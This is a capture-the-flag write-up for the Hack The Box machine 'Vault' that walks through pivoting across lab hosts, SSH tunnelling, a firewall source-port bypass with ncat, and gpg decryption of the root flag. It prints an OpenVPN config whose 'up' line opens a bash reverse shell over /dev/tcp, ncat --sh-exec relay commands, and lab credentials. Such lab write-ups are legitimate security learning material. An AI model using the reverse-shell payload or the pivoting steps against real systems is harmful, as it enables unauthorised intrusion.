&lt;h4 id=&quot;no-idea-what-to-do-with-that-key-itscominghome-so-we-will-leave-it-for-now-the-other-file-is-servers-&quot;&gt;No idea what to do with that key &lt;code class=&quot;highlighter-rouge&quot;&gt;itscominghome&lt;/code&gt; so we will leave it for now. The other file is &lt;code class=&quot;highlighter-rouge&quot;&gt;Servers&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/vault/22.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-have-another-ip-now--1921681225--we-need-to-scan-it-but-unfortunately-nmap-is-not-on-the-box-&quot;&gt;We have another ip now : &lt;code class=&quot;highlighter-rouge&quot;&gt;192.168.122.5&lt;/code&gt; , We need to scan it but unfortunately &lt;code class=&quot;highlighter-rouge&quot;&gt;nmap&lt;/code&gt; is not on the box :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/vault/23.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;alternatively-we-will-use-nc-to-scan-the-first-100-ports-like-this--nc--zv-1921681225-1-100&quot;&gt;Alternatively we will use &lt;code class=&quot;highlighter-rouge&quot;&gt;nc&lt;/code&gt; to scan the first 100 ports like this : &lt;code class=&quot;highlighter-rouge&quot;&gt;nc -zv 192.168.122.5 1-100&lt;/code&gt;&lt;/h4&gt;
&lt;h4 id=&quot;port-80-is-open-and-running-http-&quot;&gt;Port 80 is open and running http :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/vault/24.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;port-22-is-open-and-running-ssh-&quot;&gt;Port 22 is open and running ssh :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/vault/25.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-need-to-take-a-look-at-http--but-we-cant-access-that-host-directly--so-we-will-set-up-an-ssh-tunnel-to-redirect-port-80-to-our-local-machine-&quot;&gt;We need to take a look at http , but we can’t access that host directly , so we will set up an ssh tunnel to redirect port 80 to our local machine :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;ssh -L 1234:192.168.122.4:80 dave@vault.htb&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/vault/26.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;now-we-can-go-to-httplocalhost1234-and-access-that-http-service-&quot;&gt;Now we can go to &lt;code class=&quot;highlighter-rouge&quot;&gt;http://localhost:1234&lt;/code&gt; and access that http service :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/vault/27.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;dns-configurator-gives-us-a-404-response-&quot;&gt;DNS configurator gives us a &lt;code class=&quot;highlighter-rouge&quot;&gt;404&lt;/code&gt; response :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/vault/28.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;vpn-configurator-allows-us-to-create-an-ovpn-file-and-execute-it-&quot;&gt;Vpn configurator allows us to create an &lt;code class=&quot;highlighter-rouge&quot;&gt;ovpn&lt;/code&gt; file and execute it :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/vault/29.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;at-this-point-i-stopped-and-searched-on-that-topic--because-i-didnt-know-how-to-get-a-reverse-shell-from-an-ovpn-file--and-this-article-really-helped&quot;&gt;At this point I stopped and searched on that topic , because I didn’t know how to get a reverse shell from an &lt;code class=&quot;highlighter-rouge&quot;&gt;ovpn&lt;/code&gt; file , and &lt;a href=&quot;https://medium.com/tenable-techblog/reverse-shell-from-an-openvpn-configuration-file-73fd8b1d38da&quot;&gt;this article&lt;/a&gt; really helped.&lt;/h4&gt;
&lt;h4 id=&quot;we-are-going-to-listen-on-the-first-host-ubuntu-and-use-the-ovpn-configurator-to-get-a-reverse-shell-on-the-second-host-dns--we-need-to-know-the-ip-address-of-ubuntu-on-that-subnet--ifconfig-&quot;&gt;We are going to listen on the first host (&lt;code class=&quot;highlighter-rouge&quot;&gt;ubuntu&lt;/code&gt;) and use the &lt;code class=&quot;highlighter-rouge&quot;&gt;ovpn&lt;/code&gt; configurator to get a reverse shell on the second host (&lt;code class=&quot;highlighter-rouge&quot;&gt;DNS&lt;/code&gt;) , We need to know the ip address of &lt;code class=&quot;highlighter-rouge&quot;&gt;ubuntu&lt;/code&gt; on that subnet , &lt;code class=&quot;highlighter-rouge&quot;&gt;ifconfig&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/vault/30.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;ip--1921681221&quot;&gt;ip : &lt;code class=&quot;highlighter-rouge&quot;&gt;192.168.122.1&lt;/code&gt;&lt;/h4&gt;
&lt;h4 id=&quot;reverse-shell-payload-&quot;&gt;Reverse shell payload :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;remote 192.168.122.1
dev tun
nobind
script-security 2 
up &quot;/bin/bash -c 'bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.122.1/9898 0&amp;gt;&amp;amp;1'&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/vault/31.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;i-used-nobind-because-as-you-can-see-theres-a-note-saying-that-nobind-must-be-used-lets-update-the-file-and-click-on-test-vpn-then-check-our-listener-&quot;&gt;I used &lt;code class=&quot;highlighter-rouge&quot;&gt;nobind&lt;/code&gt; because as you can see there’s a note saying that &lt;code class=&quot;highlighter-rouge&quot;&gt;nobind&lt;/code&gt; must be used. Let’s update the file and click on &lt;code class=&quot;highlighter-rouge&quot;&gt;Test VPN&lt;/code&gt; then check our listener :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/vault/32.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/vault/33.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;and-we-owned-user-&quot;&gt;And we owned user !&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;ssh-on-dns&quot;&gt;SSH on DNS&lt;/h3&gt;
&lt;h4 id=&quot;in-the-home-directory-of-dave-on-dns-theres-a-file-called-ssh-which-has-ssh-credentials-&quot;&gt;In the &lt;code class=&quot;highlighter-rouge&quot;&gt;/home&lt;/code&gt; directory of &lt;code class=&quot;highlighter-rouge&quot;&gt;dave&lt;/code&gt; on &lt;code class=&quot;highlighter-rouge&quot;&gt;DNS&lt;/code&gt; there’s a file called &lt;code class=&quot;highlighter-rouge&quot;&gt;ssh&lt;/code&gt; which has ssh credentials :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/vault/34.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;so-we-can-close-that-reverse-shell-and-get-an-ssh-connection-on-dns-as-dave-dave--dav3gerous567&quot;&gt;So we can close that reverse shell and get an ssh connection on &lt;code class=&quot;highlighter-rouge&quot;&gt;DNS&lt;/code&gt; as &lt;code class=&quot;highlighter-rouge&quot;&gt;dave&lt;/code&gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;dave : dav3gerous567&lt;/code&gt;:&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/vault/35.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;but-we-had-root-on-dns--now-we-are-dave-we-want-to-get-root-again-sudo--l-tells-us-that-dave-can-use-sudo-on-any-command-&quot;&gt;But we had &lt;code class=&quot;highlighter-rouge&quot;&gt;root&lt;/code&gt; on &lt;code class=&quot;highlighter-rouge&quot;&gt;DNS&lt;/code&gt; , now we are &lt;code class=&quot;highlighter-rouge&quot;&gt;dave&lt;/code&gt;. We want to get root again. &lt;code class=&quot;highlighter-rouge&quot;&gt;sudo -l&lt;/code&gt; tells us that &lt;code class=&quot;highlighter-rouge&quot;&gt;dave&lt;/code&gt; can use sudo on any command :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/vault/36.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;so-we-can-easily-get-root-again-by-sudo-su-&quot;&gt;So we can easily get &lt;code class=&quot;highlighter-rouge&quot;&gt;root&lt;/code&gt; again by &lt;code class=&quot;highlighter-rouge&quot;&gt;sudo su&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/vault/37.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;authlog-enumeration&quot;&gt;Auth.log Enumeration&lt;/h3&gt;
&lt;h4 id=&quot;by-looking-at-servers-file-again--which-was-on-ubuntu&quot;&gt;By looking at &lt;code class=&quot;highlighter-rouge&quot;&gt;Servers&lt;/code&gt; file again , which was on &lt;code class=&quot;highlighter-rouge&quot;&gt;ubuntu&lt;/code&gt;&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/vault/22.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-notice-that-theres-a-host-called-the-vault-and-its-ip-is-not-there--so-probably-we-need-to-get-to-that-host--but-we-need-its-ip-first&quot;&gt;We notice that there’s a host called &lt;code class=&quot;highlighter-rouge&quot;&gt;The Vault&lt;/code&gt; and its ip is not there , so probably we need to get to that host , but we need its ip first.&lt;/h4&gt;
&lt;h4 id=&quot;after-a-lot-of-enumeration-i-looked-into-authlog-and-noticed-that-on-the-2nd-of-september-at-151020-and-151034-these-commands-were-executed-&quot;&gt;After a lot of enumeration I looked into &lt;code class=&quot;highlighter-rouge&quot;&gt;auth.log&lt;/code&gt; and noticed that on the 2nd of September at &lt;code class=&quot;highlighter-rouge&quot;&gt;15:10:20&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;15:10:34&lt;/code&gt; these commands were executed :&lt;/h4&gt;
&lt;h4 id=&quot;part-of-the-log-&quot;&gt;Part of the log :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Sep  2 15:08:55 DNS sudo: pam_unix(sudo:session): session closed for user root
Sep  2 15:09:01 DNS CRON[2459]: pam_unix(cron:session): session opened for user root by (uid=0)
Sep  2 15:09:01 DNS CRON[2459]: pam_unix(cron:session): session closed for user root
Sep  2 15:10:20 DNS sudo:     dave : TTY=pts/0 ; PWD=/home/dave ; USER=root ; COMMAND=/usr/bin/ncat -l 1234 --sh-exec ncat 192.168.5.2 987 -p 53
Sep  2 15:10:20 DNS sudo: pam_unix(sudo:session): session opened for user root by dave(uid=0)
Sep  2 15:10:34 DNS sudo:     dave : TTY=pts/0 ; PWD=/home/dave ; USER=root ; COMMAND=/usr/bin/ncat -l 3333 --sh-exec ncat 192.168.5.2 987 -p 53
Sep  2 15:10:34 DNS sudo: pam_unix(sudo:session): session opened for user root by
dave(uid=0)
Sep  2 15:13:43 DNS sudo: pam_unix(sudo:session): session closed for user root
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/vault/38.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;commands-&quot;&gt;Commands :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;/usr/bin/ncat -l 1234 --sh-exec ncat 192.168.5.2 987 -p 53&lt;/code&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;/usr/bin/ncat -l 3333 --sh-exec ncat 192.168.5.2 987 -p 53&lt;/code&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-have-an-ip-19216852-and-we-suspect-that-its-the-one-we-are-looking-for-i-was-using-less-to-view-the-log-so-i-searched-for-the-ip-to-see-if-it-was-mentioned-anywhere-else-19216852--and-i-found-it-here-too-&quot;&gt;We have an ip (&lt;code class=&quot;highlighter-rouge&quot;&gt;192.168.5.2&lt;/code&gt;) and we suspect that its the one we are looking for. I was using &lt;code class=&quot;highlighter-rouge&quot;&gt;less&lt;/code&gt; to view the log so I searched for the ip to see if it was mentioned anywhere else &lt;code class=&quot;highlighter-rouge&quot;&gt;:?192.168.5.2&lt;/code&gt; , And I found it here too :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/vault/39.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;command-&quot;&gt;Command :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;/usr/bin/nmap 192.168.5.2 -Pn --source-port=4444&lt;/code&gt;&lt;/p&gt;
&lt;h4 id=&quot;on-the-same-day-at-150751-that-ip-was-scanned-with-nmap--and-we-notice---source-port4444--whats-that-&quot;&gt;On the same day at &lt;code class=&quot;highlighter-rouge&quot;&gt;15:07:51&lt;/code&gt; That ip was scanned with &lt;code class=&quot;highlighter-rouge&quot;&gt;nmap&lt;/code&gt; , and we notice &lt;code class=&quot;highlighter-rouge&quot;&gt;--source-port=4444&lt;/code&gt; , what’s that ?&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;source-port--escaping-from-dns-to-vault&quot;&gt;Source Port , Escaping from &lt;code class=&quot;highlighter-rouge&quot;&gt;DNS&lt;/code&gt; to &lt;code class=&quot;highlighter-rouge&quot;&gt;vault&lt;/code&gt;&lt;/h3&gt;
&lt;h4 id=&quot;lets-take-that-nmap-command-and-run-it-again-to-see-the-results-&quot;&gt;Let’s take that nmap command and run it again to see the results :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/vault/40.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;port-987-is-open-and-the-service-is-unknown--lets-run-nmap-one-more-time-as-a-regular-scan-&quot;&gt;Port 987 is open and the service is unknown , Let’s run nmap one more time as a regular scan :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -Pn 192.168.5.2&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/vault/41.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;port-53-and-4444--both-of-them-are-closed-weird--where-is-port-987-&quot;&gt;Port 53 and 4444 , both of them are closed. weird … where is port 987 ?&lt;/h4&gt;
&lt;h4 id=&quot;so-whats-happening-is--port-987-is-only-open-when-the-source-port-is-4444-when-two-hosts-communicate-with-each-other-through-a-certain-protocol--theres-a-source-port-and-a-destination-port--the-source-port-is-the-port-which-the-request-was-sent-from-and-this-port-is-randomly-generated--the-destination-port-is-the-port-where-the-request-is-sent-to--and-it-doesnt-change-so-for-example-when-communicating-through-http--the-client-sends-the-request-from-a-source-port-which-is-random--that-request-is-sent-to-the-destination-port-which-in-this-case-is-port-80&quot;&gt;So what’s happening is , port 987 is only open when the source port is 4444. When two hosts communicate with each other through a certain protocol , there’s a source port and a destination port , the source port is the port which the request was sent from and this port is randomly generated , the destination port is the port where the request is sent to , and it doesn’t change. So for example when communicating through http , the client sends the request from a source port which is random , that request is sent to the destination port which in this case is port 80.&lt;/h4&gt;
&lt;h4 id=&quot;to-be-able-to-access-port-987-we-have-to-make-sure-that-our-source-port-is-4444-to-do-this-we-will-use-ncat-and-make-it-listen-on-port-2222--then-the-service-running-on-that-port-will-be-another-ncat-connection-from-port-4444-to-port-987-on-19216852&quot;&gt;To be able to access port 987 we have to make sure that our source port is 4444. To do this we will use &lt;code class=&quot;highlighter-rouge&quot;&gt;ncat&lt;/code&gt; and make it listen on port 2222 , then the service running on that port will be another &lt;code class=&quot;highlighter-rouge&quot;&gt;ncat&lt;/code&gt; connection from port 4444 to port 987 on &lt;code class=&quot;highlighter-rouge&quot;&gt;192.168.5.2&lt;/code&gt;&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;ncat -l 2222 --sh-exec &quot;ncat -p 4444 192.168.5.2 987&quot;&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/vault/42.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-will-get-another-ssh-connection-to-dns--then-we-will-connect-to-port-2222-on-localhost--but-before-connecting-we-need-to-know-whats-the-service-unfortunately-nmap-cant-tell-us-because-our-connection-is-not-direct&quot;&gt;We will get another ssh connection to &lt;code class=&quot;highlighter-rouge&quot;&gt;DNS&lt;/code&gt; , then we will connect to port 2222 on localhost , but before connecting we need to know what’s the service. Unfortunately &lt;code class=&quot;highlighter-rouge&quot;&gt;nmap&lt;/code&gt; can’t tell us because our connection is not direct.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/vault/43.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;so-i-guessed-common-services-and-it-was-ssh-&quot;&gt;So I guessed common services and it was &lt;code class=&quot;highlighter-rouge&quot;&gt;ssh&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/vault/44.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;i-tried-dave-as-the-username-and-dav3gerous567-as-the-password-same-credentials-for-dns-and-it-worked&quot;&gt;I tried &lt;code class=&quot;highlighter-rouge&quot;&gt;dave&lt;/code&gt; as the username and &lt;code class=&quot;highlighter-rouge&quot;&gt;dav3gerous567&lt;/code&gt; as the password (same credentials for &lt;code class=&quot;highlighter-rouge&quot;&gt;DNS&lt;/code&gt;) and it worked.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;decrypting-root-flag&quot;&gt;Decrypting root flag&lt;/h3&gt;
&lt;h4 id=&quot;in-the-home-directory-of-dave-on-vault-theres-a-file-called-roottxtgpg-&quot;&gt;In the &lt;code class=&quot;highlighter-rouge&quot;&gt;/home&lt;/code&gt; directory of &lt;code class=&quot;highlighter-rouge&quot;&gt;dave&lt;/code&gt; on &lt;code class=&quot;highlighter-rouge&quot;&gt;vault&lt;/code&gt; there’s a file called &lt;code class=&quot;highlighter-rouge&quot;&gt;root.txt.gpg&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/vault/45.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;which-is-the-root-flag-but-gpg-encrypted-&quot;&gt;Which is the root flag but gpg encrypted :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/vault/46.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-need-a-key-to-decrypt-the-flag--remember-the-key-we-saw-earlier-on-ubuntu--we-will-copy-the-file-to-ubuntu-to-decrypt-it--easiest-way-to-do-it-is-to-base64-encode-it-then-copy-the-base64-data-and-decode-it-on-ubuntu-but-base64-was-not-installed-on-vault-so-i-used-base32-instead-&quot;&gt;We need a key to decrypt the flag , remember the key we saw earlier on &lt;code class=&quot;highlighter-rouge&quot;&gt;ubuntu&lt;/code&gt; ? We will copy the file to &lt;code class=&quot;highlighter-rouge&quot;&gt;ubuntu&lt;/code&gt; to decrypt it , Easiest way to do it is to &lt;code class=&quot;highlighter-rouge&quot;&gt;base64&lt;/code&gt; encode it then copy the &lt;code class=&quot;highlighter-rouge&quot;&gt;base64&lt;/code&gt; data and decode it on &lt;code class=&quot;highlighter-rouge&quot;&gt;ubuntu&lt;/code&gt;. But &lt;code class=&quot;highlighter-rouge&quot;&gt;base64&lt;/code&gt; was not installed on &lt;code class=&quot;highlighter-rouge&quot;&gt;vault&lt;/code&gt; so I used &lt;code class=&quot;highlighter-rouge&quot;&gt;base32&lt;/code&gt; instead :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/vault/47.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/vault/48.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/vault/49.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;now-lets-decrypt-it-with-the-key--itscominghome-&quot;&gt;Now let’s decrypt it with the key : &lt;code class=&quot;highlighter-rouge&quot;&gt;itscominghome&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;gpg -d root.txt.gpg&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/vault/50.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;and-we-owned-root-&quot;&gt;And we owned root !&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;
&lt;h4 id=&quot;thats-it--feedback-is-appreciated-&quot;&gt;That’s it , Feedback is appreciated !&lt;/h4&gt;
&lt;h4 id=&quot;dont-forget-to-read-the-previous-write-ups--tweet-about-the-write-up-if-you-liked-it--follow-on-twitter-for-awesome-resources-ahm3d_h3sham&quot;&gt;Don’t forget to read the &lt;a href=&quot;/categories&quot;&gt;previous write-ups&lt;/a&gt; , Tweet about the write-up if you liked it , follow on twitter for awesome resources &lt;a href=&quot;https://twitter.com/Ahm3d_H3sham&quot;&gt;@Ahm3d_H3sham&lt;/a&gt;&lt;/h4&gt;
&lt;h4 id=&quot;thanks-for-reading&quot;&gt;Thanks for reading.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;
&lt;h4 id=&quot;previous-hack-the-box-write-up--hack-the-box---curling&quot;&gt;Previous Hack The Box write-up : &lt;a href=&quot;/hack-the-box/curling/&quot;&gt;Hack The Box - Curling&lt;/a&gt;&lt;/h4&gt;
&lt;h4 id=&quot;next-hack-the-box-write-up--hack-the-box---redcross&quot;&gt;Next Hack The Box write-up : &lt;a href=&quot;/hack-the-box/redcross/&quot;&gt;Hack The Box - RedCross&lt;/a&gt;&lt;/h4&gt;
&lt;hr /&gt;</content><author><name></name></author><category term="Linux" /><category term="Web" /><category term="RCE" /><category term="Forensics" /><category term="ssh" /><category term="Networking" /><category term="Pivoting" /><category term="Cryptography" /><summary type="html">Quick Summary Hey guys today Vault retired and here is my write-up about it. Vault was a fun box and it’s absolutely one of my favorites. Starting with an insecure file upload functionality to escaping from a host to another and getting a reverse shell with an openvpn config , Every step was very nice. It’s rated as medium , it’s a linux box and its ip is 10.10.10.109 I added it to /etc/hosts as vault.htb. Let’s jump right in ! Nmap As always we will start with nmap to scan for open ports and services : nmap -sV -sT -sC vault.htb Only two ports are open : 80 running http and 22 running ssh. As always we will check http. HTTP Initial Enumeration The main page is just displaying this message : Welcome to the Slowdaddy web interface We specialise in providing financial orginisations with strong web and database solutions and we promise to keep your customers financial data safe. We are proud to announce our first client: Sparklays (Sparklays.com still under construction) I ran gobuster but didn’t get anything , so I looked at the message again and noticed this line : We are proud to announce our first client: Sparklays (Sparklays.com still under construction). So I went to /sparklays and got a 403 response. So now we know that this directory exists and we can enumerate the sub directories of it , so I ran gobuster again and got these results : ===================================================== Gobuster v2.0.0 OJ Reeves (@TheColonial) ===================================================== [+] Mode : dir [+] Url/Domain : http://vault.htb/sparklays/ [+] Threads : 100 [+] Wordlist : /usr/share/wordlists/dirb/common.txt [+] Status codes : 200,204,301,302,307,403 [+] Timeout : 2m0s ===================================================== 2019/04/05 14:55:32 Starting gobuster ===================================================== /.hta (Status: 403) /.htpasswd (Status: 403) /.htaccess (Status: 403) /admin.php (Status: 200) /design (Status: 301) /admin.php sounds interesting. But in fact it’s useless. /admin.php : It asks for authentication , I tried test:test and got nothing. It didn’t print anything : And I also noticed that it’s sending the login data through GET parameters which is rarely used. Also checked the source of the page and there was nothing important so most likely this is just a rabbit hole and trying to bypass this login is a waste of time. /design : Design gave us a 403 response , I ran gobuster one more time and got these results : ===================================================== Gobuster v2.0.0 OJ Reeves (@TheColonial) ===================================================== [+] Mode : dir [+] Url/Domain : http://vault.htb/sparklays/design/ [+] Threads : 100 [+] Wordlist : /usr/share/wordlists/dirb/common.txt [+] Status codes : 200,204,301,302,307,403 [+] Timeout : 2m0s ===================================================== 2019/04/05 15:03:20 Starting gobuster ===================================================== /.htaccess (Status: 403) /.hta (Status: 403) /.htpasswd (Status: 403) /uploads (Status: 301) So I checked /uploads : And it was also forbidden. But since there is a directory for uploads then there might be a page for uploading files lying around somewhere. I ran gobuster again and added the extensions php and html and got a new result : design.html /design.html : There’s a link titled Change Logo which takes us to this upload page : Bypassing Restricted File Upload I created a small php script to get a reverse shell : And named it shell.php. Tried to upload and as expected , it told us that this file type is not allowed : We need to know what are the allowed file types , We will use Zap’s fuzzer and a file extenstions wordlist I got from seclists. Intercept the request –&amp;gt; right click –&amp;gt; attack –&amp;gt; Fuzzer By filtering the response body size we will notice that all the responses are 519 bytes except the response of .php5 which is 526 bytes. So it allows files with extension .php5 to be uploaded. Since the request has already been sent then the php shell is on the server now , Let’s excute it : There are two users on the box alex and dave , user flag is not on the box. On the desktop of dave there is a file called ssh which has ssh credentials : Now we can get an ssh connection as dave instead of this reverse shell as www-data dave : Dav3therav3123 : Escaping from ubuntu to DNS , openvpn reverse shell , Getting user Let’s take a look at the rest of the files on dave’s desktop : No idea what to do with that key itscominghome so we will leave it for now. The other file is Servers : We have another ip now : 192.168.122.5 , We need to scan it but unfortunately nmap is not on the box : Alternatively we will use nc to scan the first 100 ports like this : nc -zv 192.168.122.5 1-100 Port 80 is open and running http : Port 22 is open and running ssh : We need to take a look at http , but we can’t access that host directly , so we will set up an ssh tunnel to redirect port 80 to our local machine : ssh -L 1234:192.168.122.4:80 dave@vault.htb Now we can go to http://localhost:1234 and access that http service : DNS configurator gives us a 404 response : Vpn configurator allows us to create an ovpn file and execute it : At this point I stopped and searched on that topic , because I didn’t know how to get a reverse shell from an ovpn file , and this article really helped. We are going to listen on the first host (ubuntu) and use the ovpn configurator to get a reverse shell on the second host (DNS) , We need to know the ip address of ubuntu on that subnet , ifconfig : ip : 192.168.122.1 Reverse shell payload : remote 192.168.122.1 dev tun nobind script-security 2 up &quot;/bin/bash -c 'bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.122.1/9898 0&amp;gt;&amp;amp;1'&quot; I used nobind because as you can see there’s a note saying that nobind must be used. Let’s update the file and click on Test VPN then check our listener : And we owned user ! SSH on DNS In the /home directory of dave on DNS there’s a file called ssh which has ssh credentials : So we can close that reverse shell and get an ssh connection on DNS as dave dave : dav3gerous567: But we had root on DNS , now we are dave. We want to get root again. sudo -l tells us that dave can use sudo on any command : So we can easily get root again by sudo su : Auth.log Enumeration By looking at Servers file again , which was on ubuntu We notice that there’s a host called The Vault and its ip is not there , so probably we need to get to that host , but we need its ip first. After a lot of enumeration I looked into auth.log and noticed that on the 2nd of September at 15:10:20 and 15:10:34 these commands were executed : Part of the log : Sep 2 15:08:55 DNS sudo: pam_unix(sudo:session): session closed for user root Sep 2 15:09:01 DNS CRON[2459]: pam_unix(cron:session): session opened for user root by (uid=0) Sep 2 15:09:01 DNS CRON[2459]: pam_unix(cron:session): session closed for user root Sep 2 15:10:20 DNS sudo: dave : TTY=pts/0 ; PWD=/home/dave ; USER=root ; COMMAND=/usr/bin/ncat -l 1234 --sh-exec ncat 192.168.5.2 987 -p 53 Sep 2 15:10:20 DNS sudo: pam_unix(sudo:session): session opened for user root by dave(uid=0) Sep 2 15:10:34 DNS sudo: dave : TTY=pts/0 ; PWD=/home/dave ; USER=root ; COMMAND=/usr/bin/ncat -l 3333 --sh-exec ncat 192.168.5.2 987 -p 53 Sep 2 15:10:34 DNS sudo: pam_unix(sudo:session): session opened for user root by dave(uid=0) Sep 2 15:13:43 DNS sudo: pam_unix(sudo:session): session closed for user root Commands : /usr/bin/ncat -l 1234 --sh-exec ncat 192.168.5.2 987 -p 53 /usr/bin/ncat -l 3333 --sh-exec ncat 192.168.5.2 987 -p 53 We have an ip (192.168.5.2) and we suspect that its the one we are looking for. I was using less to view the log so I searched for the ip to see if it was mentioned anywhere else :?192.168.5.2 , And I found it here too : Command : /usr/bin/nmap 192.168.5.2 -Pn --source-port=4444 On the same day at 15:07:51 That ip was scanned with nmap , and we notice --source-port=4444 , what’s that ? Source Port , Escaping from DNS to vault Let’s take that nmap command and run it again to see the results : Port 987 is open and the service is unknown , Let’s run nmap one more time as a regular scan : nmap -Pn 192.168.5.2 Port 53 and 4444 , both of them are closed. weird … where is port 987 ? So what’s happening is , port 987 is only open when the source port is 4444. When two hosts communicate with each other through a certain protocol , there’s a source port and a destination port , the source port is the port which the request was sent from and this port is randomly generated , the destination port is the port where the request is sent to , and it doesn’t change. So for example when communicating through http , the client sends 